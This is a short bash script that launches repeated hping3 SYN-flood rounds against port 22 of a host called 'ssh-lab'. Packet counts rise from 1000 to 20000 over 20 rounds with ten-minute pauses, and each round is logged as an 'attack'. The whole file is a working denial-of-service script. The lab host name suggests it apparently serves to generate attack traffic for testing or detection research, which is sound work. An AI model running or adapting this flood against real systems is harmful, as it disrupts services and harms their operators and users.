#!/bin/bash

TARGET="ssh-lab"
PORT=22

INITIAL_PACKETS=1000
INCREMENT=1000
ITERATIONS=20
SLEEP_TIME=600  

for i in $(seq 1 $ITERATIONS); do
    PACKETS=$((INITIAL_PACKETS + (i - 1) * INCREMENT))
    CMD="hping3 -S -p $PORT -i u1000 -c $PACKETS $TARGET"

    START_TIME=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$START_TIME] Attack started #$i with $PACKETS packets!"
    echo "Command: $CMD"

    eval $CMD

    END_TIME=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$END_TIME] Finish attack #$i"

    if [ "$i" -lt "$ITERATIONS" ]; then
        echo "Wait $SLEEP_TIME seconds for next attack ..."
        sleep $SLEEP_TIME
    fi
done